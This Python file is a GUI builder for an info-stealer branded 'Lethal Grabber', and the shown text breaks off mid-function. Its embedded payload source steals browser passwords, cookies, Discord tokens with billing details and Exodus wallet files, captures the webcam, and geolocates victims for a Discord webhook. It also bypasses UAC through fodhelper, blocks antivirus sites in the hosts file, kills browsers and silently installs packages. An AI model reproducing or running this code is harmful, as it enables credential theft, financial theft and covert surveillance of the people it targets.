#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, colorchooser
import subprocess
import os
import sys
import json
import threading
import shutil
import tempfile
import time
import re
import base64
import sqlite3
import uuid
import io
import zipfile
import platform
import getpass
import socket
import math
import textwrap
from datetime import datetime, timezone
from glob import glob
from struct import unpack
from binascii import hexlify, unhexlify
from hashlib import sha1, pbkdf2_hmac
from PIL import Image, ImageTk, ImageDraw, ImageGrab as PIL_ImageGrab

def generate_grabber_source(webhook_url, webhook_name, webhook_avatar, features, ping_everyone=False, block_av_sites=False, grab_crypto=False, webcam_capture=False, grab_address=False):
    
    def b(v): return "True" if v else "False"
    
    ph_webhook_url = json.dumps(webhook_url)
    ph_webhook_name = json.dumps(webhook_name)
    ph_webhook_avatar = json.dumps(webhook_avatar)
    ph_passwords = b(features.get("passwords", True))
    ph_autofills = b(features.get("autofills", True))
    ph_cookies = b(features.get("cookies", True))
    ph_tokens = b(features.get("tokens", True))
    ph_roblox = b(features.get("roblox", True))
    ph_minecraft = b(features.get("minecraft", True))
    ph_winkey = b(features.get("winkey", True))
    ph_screenshot = b(features.get("screenshot", True))
    ph_system = b(features.get("system", True))
    ph_messenger = b(features.get("messenger", True))
    ph_persistence = b(features.get("persistence", True))
    ph_selfdestruct = b(features.get("selfdestruct", True))
    ph_ping_everyone = b(ping_everyone)
    ph_block_av = b(block_av_sites)
    ph_grab_crypto = b(grab_crypto)
    ph_webcam = b(webcam_capture)
    ph_grab_address = b(grab_address)
    
    code = r'''# -*- coding: utf-8 -*-
import os, sys, json, base64, re, sqlite3, shutil, tempfile, time, uuid, subprocess, platform, socket, getpass, struct, zipfile, io, mimetypes
from datetime import datetime, timezone
from glob import glob
from hashlib import sha1, pbkdf2_hmac
from binascii import unhexlify, hexlify
import urllib.request

WEBHOOK_URL = __PH_WEBHOOK_URL__
WEBHOOK_NAME = __PH_WEBHOOK_NAME__
WEBHOOK_AVATAR = __PH_WEBHOOK_AVATAR__

FEAT_PASSWORDS = __PH_PASSWORDS__
FEAT_AUTOFILLS = __PH_AUTOFILLS__
FEAT_COOKIES = __PH_COOKIES__
FEAT_TOKENS = __PH_TOKENS__
FEAT_ROBLOX = __PH_ROBLOX__
FEAT_MINECRAFT = __PH_MINECRAFT__
FEAT_WINKEY = __PH_WINKEY__
FEAT_SCREENSHOT = __PH_SCREENSHOT__
FEAT_SYSTEM = __PH_SYSTEM__
FEAT_MESSENGER = __PH_MESSENGER__
FEAT_PERSISTENCE = __PH_PERSISTENCE__
FEAT_SELFDESTRUCT = __PH_SELFDESTRUCT__
FEAT_PING_EVERYONE = __PH_PING_EVERYONE__
FEAT_BLOCK_AV = __PH_BLOCK_AV__
FEAT_GRAB_CRYPTO = __PH_GRAB_CRYPTO__
FEAT_WEBCAM = __PH_WEBCAM__
FEAT_GRAB_ADDRESS = __PH_GRAB_ADDRESS__

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")
TEMP_DIR = tempfile.gettempdir()
STARTUP_DIR = os.path.join(ROAMING, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
PC_NAME = platform.node() or os.getenv("COMPUTERNAME", "Unknown")

HAS_REQUESTS = False
HAS_WIN32CRYPT = False
HAS_PIL = False
HAS_CRYPTO = False
HAS_OPENCV = False

try:
    import requests
    HAS_REQUESTS = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=30)
        import requests
        HAS_REQUESTS = True
    except:
        pass

try:
    import win32crypt
    HAS_WIN32CRYPT = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=30)
        import win32crypt
        HAS_WIN32CRYPT = True
    except:
        pass

try:
    from Crypto.Cipher import AES, DES3
    from Crypto.Protocol.KDF import PBKDF2
    HAS_CRYPTO = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=60)
        from Crypto.Cipher import AES, DES3
        from Crypto.Protocol.KDF import PBKDF2
        HAS_CRYPTO = True
    except:
        pass

try:
    from PIL import ImageGrab
    HAS_PIL = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "Pillow", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=30)
        from PIL import ImageGrab
        HAS_PIL = True
    except:
        pass

try:
    import cv2
    HAS_OPENCV = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "opencv-python", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=60)
        import cv2
        HAS_OPENCV = True
    except:
        pass

def block_av_sites():
    if not FEAT_BLOCK_AV:
        return
    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        av_sites = [
            "www.kaspersky.com", "kaspersky.com",
            "www.avast.com", "avast.com",
            "www.avg.com", "avg.com",
            "www.norton.com", "norton.com",
            "www.mcafee.com", "mcafee.com",
            "www.eset.com", "eset.com",
            "www.bitdefender.com", "bitdefender.com",
            "www.malwarebytes.com", "malwarebytes.com",
            "www.sophos.com", "sophos.com",
            "www.trendmicro.com", "trendmicro.com",
            "www.pandasecurity.com", "pandasecurity.com",
            "www.f-secure.com", "f-secure.com",
            "www.comodo.com", "comodo.com",
            "www.clamav.net", "clamav.net",
            "virusscan.jotti.org", "www.virustotal.com",
            "virustotal.com", "www.hybrid-analysis.com",
            "hybrid-analysis.com", "any.run", "www.any.run",
        ]
        with open(hosts_path, "a") as f:
            f.write("\n# Block AV Sites - Lethal Grabber\n")
            for site in av_sites:
                f.write(f"127.0.0.1 {site}\n")
                f.write(f"0.0.0.0 {site}\n")
    except:
        pass

def grab_address_via_browser():
    try:
        try:
            import selenium
        except:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "selenium", "--quiet"],
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                timeout=30
            )
            import selenium
        
        import selenium.webdriver as webdriver
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.edge.options import Options as EdgeOptions
        
        browser_paths = [
            (ChromeOptions, [
                os.path.join(LOCAL, "Google", "Chrome SxS", "Application", "chrome.exe"),
                os.path.join(ROAMING, "Google", "Chrome", "Application", "chrome.exe"),
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            ]),
            (EdgeOptions, [
                os.path.join(LOCAL, "Microsoft", "Edge", "Application", "msedge.exe"),
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
            ])
        ]
        
        for OptionsClass, paths in browser_paths:
            found_browser = None
            for p in paths:
                if os.path.exists(p):
                    found_browser = p
                    break
            
            if not found_browser:
                continue
            
            try:
                options = OptionsClass()
                
                prefs = {
                    "profile.default_content_setting_values.geolocation": 1,
                    "profile.content_settings.exceptions.geolocation": {},
                    "profile.managed_default_content_settings.geolocation": 1,
                    "geolocation": {"allow": True},
                    "browser.geolocation.enabled": True,
                }
                options.add_experimental_option("prefs", prefs)
                
                options.add_argument("--disable-notifications")
                options.add_argument("--disable-popup-blocking")
                options.add_argument("--deny-permission-prompts=false")
                options.add_argument("--auto-accept-geolocation")
                options.add_argument("--use-fake-ui-for-media-stream")
                options.add_argument("--enable-features=AllowAllGeolocation")
                
                options.add_argument("--headless=new")
                options.add_argument("--disable-gpu")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--window-size=1920,1080")
                options.add_argument("--log-level=3")
                options.add_argument("--silent")
                
                options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
                
                temp_profile = os.path.join(TEMP_DIR, f"browser_{uuid.uuid4().hex}")
                os.makedirs(temp_profile, exist_ok=True)
                
                if isinstance(options, ChromeOptions):
                    options.add_argument(f"--user-data-dir={temp_profile}")
                    driver = webdriver.Chrome(options=options)
                else:
                    options.add_argument(f"--user-data-dir={temp_profile}")
                    driver = webdriver.Edge(options=options)
                
                driver.set_page_load_timeout(15)
                
                driver.get("https://whatismyaddress.net/")
                time.sleep(3)
                
                address = None
                selectors = [
                    "address",
                    ".address",
                    "#address",
                    ".location-address",
                    ".street-address",
                    "[data-testid='address']",
                    ".result",
                    ".full-address",
                    "p.address",
                    "span.address",
                    "div.address",
                    ".my-address",
                    ".location-info",
                ]
                
                for selector in selectors:
                    try:
                        elem = driver.find_element("css selector", selector)
                        text = elem.text.strip()
                        if text and len(text) > 10 and any(c.isdigit() for c in text):
                            address = text
                            break
                    except:
                        continue
                
                if not address:
                    try:
                        body = driver.find_element("tag name", "body")
                        all_text = body.text
                        lines = [l.strip() for l in all_text.split('\n') if l.strip()]
                        addr_keywords = ['street', 'st ', 'avenue', 'ave ', 'road', 'rd ', 'drive', 'dr ', 
                                        'lane', 'ln ', 'boulevard', 'blvd', 'way', 'court', 'ct ',
                                        'circle', 'cir ', 'place', 'pl ', 'trail', 'trl ']
                        for line in lines:
                            line_lower = line.lower()
                            if any(kw in line_lower for kw in addr_keywords) and any(c.isdigit() for c in line):
                                if len(line) > 15:
                                    address = line
                                    break
                    except:
                        pass
                
                if not address:
                    try:
                        title = driver.title
                        if title and any(c.isdigit() for c in title) and len(title) > 10:
                            address = title
                    except:
                        pass
                
                if not address:
                    try:
                        js_text = driver.execute_script("""
                            return document.body.innerText;
                        """)
                        lines = [l.strip() for l in js_text.split('\n') if l.strip()]
                        for line in lines:
                            line_lower = line.lower()
                            addr_keywords = ['street', 'avenue', 'road', 'drive', 'lane', 'boulevard', 'way']
                            if any(kw in line_lower for kw in addr_keywords) and any(c.isdigit() for c in line):
                                if len(line) > 15:
                                    address = line
                                    break
                    except:
                        pass
                
                driver.quit()
                
                try:
                    shutil.rmtree(temp_profile, ignore_errors=True)
                except:
                    pass
                
                if address:
                    if len(address) > 200:
                        address = address[:200]
                    return address
                
            except Exception as e:
                try:
                    driver.quit()
                except:
                    pass
                try:
                    shutil.rmtree(temp_profile, ignore_errors=True)
                except:
                    pass
                continue
        
        return None
    
    except Exception as e:
        return None

def grab_crypto_wallets():
    if not FEAT_GRAB_CRYPTO:
        return []
    results = []
    wallet_paths = {
        "Exodus": os.path.join(ROAMING, "Exodus"),
        "Electrum": os.path.join(ROAMING, "Electrum"),
        "Bitcoin Core": os.path.join(ROAMING, "Bitcoin"),
        "Ethereum": os.path.join(ROAMING, "Ethereum"),
        "Monero": os.path.join(ROAMING, "Monero"),
        "Zcash": os.path.join(ROAMING, "Zcash"),
        "Dash": os.path.join(ROAMING, "DashCore"),
        "Litecoin": os.path.join(ROAMING, "Litecoin"),
        "Atomic Wallet": os.path.join(ROAMING, "atomic"),
        "Guarda": os.path.join(ROAMING, "Guarda"),
        "Coinomi": os.path.join(ROAMING, "Coinomi"),
        "Jaxx": os.path.join(ROAMING, "Jaxx"),
    }
    for name, path in wallet_paths.items():
        if os.path.isdir(path):
            wallet_data = os.listdir(path)
            results.append(f"{name}: {path} ({len(wallet_data)} files)")
    return results

def grab_exodus_wallet_folder():
    exodus_wallet_path = os.path.join(ROAMING, "Exodus", "exodus.wallet")
    if os.path.isdir(exodus_wallet_path):
        try:
            temp_zip = os.path.join(TEMP_DIR, f"exodus_wallet_{uuid.uuid4().hex}.zip")
            with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(exodus_wallet_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, os.path.dirname(exodus_wallet_path))
                        try:
                            zf.write(file_path, arcname)
                        except:
                            pass
            return temp_zip
        except:
            pass
    return None

def capture_webcam_image():
    if not FEAT_WEBCAM or not HAS_OPENCV:
        return None
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                path = os.path.join(TEMP_DIR, f"cam_{uuid.uuid4().hex}.jpg")
                cv2.imwrite(path, frame)
                cap.release()
                cv2.destroyAllWindows()
                return path
            cap.release()
        cv2.destroyAllWindows()
    except:
        pass
    return None

def show_error_message():
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, "__PH_ERROR_CONTENT__", "__PH_ERROR_TITLE__", 0x10 | 0x1000)
    except:
        pass

def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def uac_bypass_fodhelper():
    try:
        import winreg as _wr
        script_path = sys.executable + ' "' + os.path.abspath(sys.argv[0]) + '"'
        k = _wr.CreateKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command")
        _wr.SetValueEx(k, "DelegateExecute", 0, _wr.REG_SZ, "")
        _wr.SetValueEx(k, "", 0, _wr.REG_SZ, script_path)
        _wr.CloseKey(k)
        subprocess.run(["C:\\Windows\\System32\\fodhelper.exe"], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(2)
        try:
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command")
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open")
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell")
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
        except:
            pass
        return True
    except:
        return False

def asn1_parse(data, offset=0):
    results = []
    pos = offset
    while pos < len(data):
        tag = data[pos]
        pos += 1
        length = data[pos]
        pos += 1
        if length & 0x80:
            num_bytes = length & 0x7F
            length = 0
            for _ in range(num_bytes):
                length = (length << 8) | data[pos]
                pos += 1
        value = data[pos:pos+length]
        pos += length
        results.append((tag, length, value, pos))
    return results

def firefox_decrypt_pbe(encrypted_data, password, global_salt, entry_salt):
    try:
        hp = sha1(global_salt + password.encode()).digest()
        chp = sha1(entry_salt + hp).digest()
        pbe = b'\x00\x00\x00\x02' + entry_salt + chp + b'\x01'
        sk1 = sha1(pbe).digest()[:20]
        pbe2 = b'\x00\x00\x00\x02' + entry_salt + chp + b'\x02'
        sk2 = sha1(pbe2).digest()[:20]
        k = sk1 + sk2
        des_key = k[:24]
        iv = k[24:32]
        cipher = DES3.new(des_key, DES3.MODE_CBC, iv=iv)
        decrypted = cipher.decrypt(encrypted_data)
        padding_len = decrypted[-1]
        if padding_len <= 8:
            decrypted = decrypted[:-padding_len]
        return decrypted
    except:
        return None

def decrypt_firefox_passwords(profile_path):
    results = []
    key4_path = os.path.join(profile_path, "key4.db")
    logins_path = os.path.join(profile_path, "logins.json")
    if not os.path.exists(key4_path) or not os.path.exists(logins_path):
        return results
    try:
        with open(logins_path, "r", encoding="utf-8") as f:
            logins_data = json.load(f)
        tmp_key = os.path.join(TEMP_DIR, f"k4_{uuid.uuid4().hex}.db")
        shutil.copy2(key4_path, tmp_key)
        conn = sqlite3.connect(tmp_key)
        c = conn.cursor()
        c.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
        row = c.fetchone()
        if not row:
            conn.close()
            os.remove(tmp_key)
            return results
        global_salt = row[0]
        item2 = row[1]
        parsed = asn1_parse(item2)
        if len(parsed) < 1:
            conn.close()
            os.remove(tmp_key)
            return results
        entry_salt = None
        ciphertext = None
        def _extract_from_asn1(parsed_items, depth=0):
            nonlocal entry_salt, ciphertext
            for tag, length, value, _ in parsed_items:
                if tag == 0x04:
                    if entry_salt is None and len(value) == len(global_salt):
                        entry_salt = value
                    elif ciphertext is None and len(value) > 20:
                        ciphertext = value
                elif tag == 0x30:
                    inner = asn1_parse(value)
                    _extract_from_asn1(inner, depth+1)
        _extract_from_asn1(parsed)
        if not entry_salt or not ciphertext:
            try:
                pos = 2
                if item2[pos] & 0x80:
                    num = item2[pos] & 0x7F
                    pos += 1 + num
                else:
                    pos += 1
                pos += 1
                if item2[pos] & 0x80:
                    num = item2[pos] & 0x7F
                    pos += 1 + num
                else:
                    pos += 1
                if item2[pos] == 0x04:
                    pos += 1
                    salt_len = item2[pos]
                    pos += 1
                    entry_salt = item2[pos:pos+salt_len]
                    pos += salt_len
                if item2[pos] == 0x30:
                    pos += 1
                    if item2[pos] & 0x80:
                        num = item2[pos] & 0x7F
                        pos += 1 + num
                    else:
                        pos += 1
                    pos += 2
                    pos += item2[pos-1] + item2[pos] + 2 if item2[pos] == 0x04 else 0
                if pos < len(item2) and item2[pos] == 0x04:
                    pos += 1
                    ct_len = item2[pos]
                    pos += 1
                    if ct_len & 0x80:
                        num2 = ct_len & 0x7F
                        ct_len = 0
                        for _ in range(num2):
                            ct_len = (ct_len << 8) | item2[pos]
                            pos += 1
                    ciphertext = item2[pos:pos+ct_len]
            except:
                pass
        if not entry_salt or not ciphertext:
            conn.close()
            os.remove(tmp_key)
            return results
        c.execute("SELECT a11, a102 FROM nssPrivate")
        row = c.fetchone()
        conn.close()
        os.remove(tmp_key)
        if not row:
            return results
        password = ""
        try:
            hp = sha1(global_salt + password.encode()).digest()
            chp = sha1(entry_salt + hp).digest()
            pbe1 = b'\x00\x00\x00\x02' + entry_salt + chp + b'\x01'
            sk1 = sha1(pbe1).digest()[:20]
            pbe2 = b'\x00\x00\x00\x02' + entry_salt + chp + b'\x02'
            sk2 = sha1(pbe2).digest()[:20]
            k = sk1 + sk2
            des_key_3des = k[:24]
            iv_3des = k[24:32]
            cipher = DES3.new(des_key_3des, DES3.MODE_CBC, iv=iv_3des)
            decrypted_key = cipher.decrypt(ciphertext)
            pad = decrypted_key[-1]
            if pad <= 8:
                decrypted_key = decrypted_key[:-pad]
            if len(decrypted_key) >= 32:
                raw_key = decrypted_key[-24:]
                for entry in logins_data.get("logins", []):
                    hostname = entry.get("hostname", "Unknown")
                    enc_user_b64 = entry.get("encryptedUsername", "")
                    enc_pass_b64 = entry.get("encryptedPassword", "")
                    if not enc_user_b64 or not enc_pass_b64:
                        continue
                    try:
                        enc_user = base64.b64decode(enc_user_b64)
                        enc_pass = base64.b64decode(enc_pass_b64)
                        if len(enc_user) >= 16:
                            user_nonce = enc_user[:16]
                            user_ct = enc_user[16:]
                            cipher_u = DES3.new(raw_key, DES3.MODE_CBC, iv=user_nonce)
                            dec_user = cipher_u.decrypt(user_ct)
                            pad_u = dec_user[-1]
                            if pad_u <= 8:
                                dec_user = dec_user[:-pad_u]
                            username = dec_user.decode('utf-8', errors='ignore')
                        else:
                            username = ""
                        if len(enc_pass) >= 16:
                            pass_nonce = enc_pass[:16]
                            pass_ct = enc_pass[16:]
                            cipher_p = DES3.new(raw_key, DES3.MODE_CBC, iv=pass_nonce)
                            dec_pass = cipher_p.decrypt(pass_ct)
                            pad_p = dec_pass[-1]
                            if pad_p <= 8:
                                dec_pass = dec_pass[:-pad_p]
                            password_val = dec_pass.decode('utf-8', errors='ignore')
                        else:
                            password_val = ""
                        if username or password_val:
                            results.append(f"URL: {hostname}\nUsername: {username}\nPassword: {password_val}\nProfile: {os.path.basename(profile_path)}\n{chr(61)*50}")
                        else:
                            results.append(f"URL: {hostname}\nUsername: [decryption failed]\nPassword: [decryption failed]\nProfile: {os.path.basename(profile_path)}\n{chr(61)*50}")
                    except:
                        results.append(f"URL: {hostname}\nUsername: [decrypt error]\nPassword: [decrypt error]\nProfile: {os.path.basename(profile_path)}\n{chr(61)*50}")
        except:
            pass
    except Exception as e:
        try: os.remove(tmp_key)
        except: pass
    return results

def decrypt_chromium_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key:
            return None
        raw = base64.b64decode(encrypted_key)
        if raw.startswith(b'DPAPI'):
            raw = raw[5:]
        if HAS_WIN32CRYPT:
            return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
    except:
        pass
    return None

def decrypt_chromium_value(encrypted_value, master_key, domain=""):
    if not encrypted_value or not master_key:
        return b""
    if isinstance(encrypted_value, str):
        encrypted_value = encrypted_value.encode('latin-1')
    if len(encrypted_value) < 3:
        return b""
    prefix = encrypted_value[:3]
    if prefix not in (b'v10', b'v11', b'v20') and HAS_WIN32CRYPT:
        try:
            raw = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            if raw and len(raw) > 0:
                return raw
        except:
            pass
        try:
            return encrypted_value
        except:
            return b""
    if prefix in (b'v10', b'v11', b'v20') and len(encrypted_value) >= 15:
        try:
            nonce = encrypted_value[3:15]
            ct = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            if not ct:
                return b""
            from Crypto.Cipher import AES
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ct, tag)
            if prefix == b'v20' and len(plaintext) > 32:
                return plaintext[32:]
            return plaintext
        except:
            pass
    return b""

def get_geolocation():
    try:
        ip = None
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
                ip = json.loads(r.read().decode()).get("ip")
        except:
            pass
        if not ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
            except:
                pass
        if ip:
            try:
                with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query", timeout=5) as r:
                    data = json.loads(r.read().decode())
                    if data.get("status") == "success":
                        return data
            except:
                pass
    except:
        pass
    return None

def get_discord_tokens_with_info():
    if not HAS_REQUESTS:
        return []
    raw_tokens = []
    plaintext_regex = re.compile(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}')
    mfa_regex = re.compile(r'mfa\.[\w-]{84}')
    for client_dir in [
        os.path.join(ROAMING, "discord"),
        os.path.join(ROAMING, "discordcanary"),
        os.path.join(ROAMING, "discordptb"),
        os.path.join(ROAMING, "discorddevelopment"),
    ]:
        ldb = os.path.join(client_dir, "Local Storage", "leveldb")
        if not os.path.isdir(ldb):
            continue
        for fname in os.listdir(ldb):
            if not fname.endswith((".ldb", ".log")):
                continue
            fpath = os.path.join(ldb, fname)
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
            except:
                try:
                    with open(fpath, "rb") as f:
                        content = f.read().decode("utf-8", errors="ignore")
                except:
                    continue
            for match in plaintext_regex.findall(content):
                try:
                    parts = match.split(".")
                    uid_decoded = base64.b64decode(parts[0] + "==").decode("utf-8", errors="ignore")
                    if uid_decoded.isdigit() and match not in raw_tokens:
                        raw_tokens.append(match)
                except:
                    if match not in raw_tokens:
                        raw_tokens.append(match)
            for match in mfa_regex.findall(content):
                if match not in raw_tokens:
                    raw_tokens.append(match)
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        master_key = decrypt_chromium_key(os.path.join(base_path, "Local State"))
        if not master_key:
            continue
        profiles = ["Default"] + [p for p in os.listdir(base_path) if p.startswith("Profile ")]
        for profile in profiles:
            ldb = os.path.join(base_path, profile, "Local Storage", "leveldb")
            if not os.path.isdir(ldb):
                continue
            for fname in os.listdir(ldb):
                if not fname.endswith((".ldb", ".log")):
                    continue
                fpath = os.path.join(ldb, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except:
                    try:
                        with open(fpath, "rb") as f:
                            content = f.read().decode("utf-8", errors="ignore")
                    except:
                        continue
                for match in plaintext_regex.findall(content):
                    try:
                        parts = match.split(".")
                        uid_decoded = base64.b64decode(parts[0] + "==").decode("utf-8", errors="ignore")
                        if uid_decoded.isdigit() and match not in raw_tokens:
                            raw_tokens.append(match)
                    except:
                        if match not in raw_tokens:
                            raw_tokens.append(match)
                for match in mfa_regex.findall(content):
                    if match not in raw_tokens:
                        raw_tokens.append(match)
    formatted_tokens = []
    seen_tokens = set()
    for token in raw_tokens:
        if token in seen_tokens:
            continue
        seen_tokens.add(token)
        try:
            hdrs = {"Authorization": token, "Content-Type": "application/json"}
            r = requests.get("https://discord.com/api/v10/users/@me", headers=hdrs, timeout=5)
            if r.status_code == 200:
                u = r.json()
                username = u.get('username', '?') + '#' + str(u.get('discriminator', '0'))
                uid = u.get('id', '?')
                email = u.get('email', 'None')
                phone = u.get('phone', 'No Phone Number') or 'No Phone Number'
                mfa = 'Yes' if u.get('mfa_enabled') else 'No'
                verified = 'Yes' if u.get('verified') else 'No'
                nitro = 'No Nitro'
                try:
                    r2 = requests.get("https://discord.com/api/v10/users/@me/billing/subscriptions", headers=hdrs, timeout=5)
                    if r2.status_code == 200:
                        subs = r2.json()
                        if subs:
                            nitro_types = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
                            n = []
                            for s in subs:
                                nt = nitro_types.get(s.get("plan_id", 0), "?")
                                if nt not in n:
                                    n.append(nt)
                            nitro = ", ".join(n) if n else "No Nitro"
                except:
                    pass
                billing = 'None'
                try:
                    r3 = requests.get("https://discord.com/api/v10/users/@me/billing/payment-sources", headers=hdrs, timeout=5)
                    if r3.status_code == 200:
                        srcs = r3.json()
                        if srcs:
                            types = []
                            for s in srcs:
                                t = s.get('type', '?')
                                brand = s.get('brand', '')
                                if brand:
                                    types.append(f"{brand} ({t})")
                                else:
                                    types.append(t.capitalize() if t != '?' else '?')
                            billing = ', '.join(types) if types else 'None'
                except:
                    pass
                try:
                    requests.post("https://discord.com/api/v9/auth/logout", headers=hdrs, json={}, timeout=3)
                except:
                    pass
                formatted_tokens.append(
                    f"Username: {username}\nUser ID: {uid}\nMFA enabled: {mfa}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {nitro}\nBilling Method(s): {billing}\n\nToken: {token}\n\n"
                )
            else:
                formatted_tokens.append(f"Token: {token}\n(Status: {r.status_code} - expired/invalid)\n\n")
        except:
            formatted_tokens.append(f"Token: {token}\n(Error validating)\n\n")
    return formatted_tokens

def get_chromium_browsers_list():
    return [
        (["Chrome"], ROAMING + "\\Google\\Chrome\\User Data"),
        (["Chrome Beta"], ROAMING + "\\Google\\Chrome Beta\\User Data"),
        (["Chrome SxS"], LOCAL + "\\Google\\Chrome SxS\\User Data"),
        (["Chromium"], LOCAL + "\\Chromium\\User Data"),
        (["Brave"], LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data"),
        (["Brave Beta"], LOCAL + "\\BraveSoftware\\Brave-Browser-Beta\\User Data"),
        (["Opera"], ROAMING + "\\Opera Software\\Opera Stable"),
        (["Opera GX"], ROAMING + "\\Opera Software\\Opera GX Stable"),
        (["Edge"], LOCAL + "\\Microsoft\\Edge\\User Data"),
        (["Edge Beta"], LOCAL + "\\Microsoft\\Edge Beta\\User Data"),
        (["Vivaldi"], LOCAL + "\\Vivaldi\\User Data"),
        (["Yandex"], LOCAL + "\\Yandex\\YandexBrowser\\User Data"),
        (["360Browser"], LOCAL + "\\360Browser\\Browser\\User Data"),
        (["CocCoc"], LOCAL + "\\CocCoc\\Browser\\User Data"),
        (["Slimjet"], LOCAL + "\\Slimjet\\User Data"),
        (["SRWare Iron"], LOCAL + "\\SRWare Iron\\User Data"),
        (["Torch"], LOCAL + "\\Torch\\User Data"),
        (["Comodo Dragon"], LOCAL + "\\Comodo\\Dragon\\User Data"),
        (["Epic Privacy"], LOCAL + "\\Epic Privacy Browser\\User Data"),
        (["Amigo"], LOCAL + "\\Amigo\\User Data"),
        (["Orbitum"], LOCAL + "\\Orbitum\\User Data"),
    ]

def kill_browsers():
    targets = [
        "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", 
        "vivaldi.exe", "yandex.exe", "firefox.exe", "iexplore.exe",
        "360browser.exe", "coccoc.exe", "slimjet.exe", "torch.exe",
        "epic.exe", "amigo.exe", "orbitum.exe", "comodo.exe",
        "discord.exe", "discordcanary.exe", "discordptb.exe"
    ]
    for proc in targets:
        try:
            subprocess.run(["taskkill", "/f", "/im", proc], 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def get_chromium_master_key(user_data_path):
    local_state = os.path.join(user_data_path, "Local State")
    if os.path.exists(local_state):
        return decrypt_chromium_key(local_state)
    return None

def get_cookies_from_profile(profile_path, master_key):
    results = []
    cookies_db = os.path.join(profile_path, "Network", "Cookies")
    if not os.path.exists(cookies_db):
        cookies_db = os.path.join(profile_path, "Cookies")
    if not os.path.exists(cookies_db):
        return results
    try:
        tmp = os.path.join(TEMP_DIR, f"ck_{uuid.uuid4().hex}.db")
        shutil.copy2(cookies_db, tmp)
        conn = sqlite3.connect(tmp)
        cursor = conn.execute("PRAGMA table_info(cookies)")
        columns = [row[1] for row in cursor.fetchall()]
        select_cols = ["host_key", "name", "path", "encrypted_value"]
        has_value_col = "has_value" in columns
        has_plain_col = "value" in columns
        if has_value_col:
            select_cols.append("has_value")
        if has_plain_col:
            select_cols.append("value")
        query = "SELECT " + ", ".join(select_cols) + " FROM cookies"
        for row in conn.execute(query):
            row_dict = dict(zip(select_cols, row))
            cookie_value = None
            if has_plain_col and has_value_col:
                if row_dict.get("has_value") and row_dict.get("value"):
                    val = row_dict["value"]
                    if isinstance(val, bytes):
                        try:
                            val = val.decode('utf-8', errors='ignore')
                        except:
                            val = str(val)
                    if val and len(str(val)) > 0:
                        cookie_value = str(val)
            if cookie_value is None:
                enc_val = row_dict.get("encrypted_value")
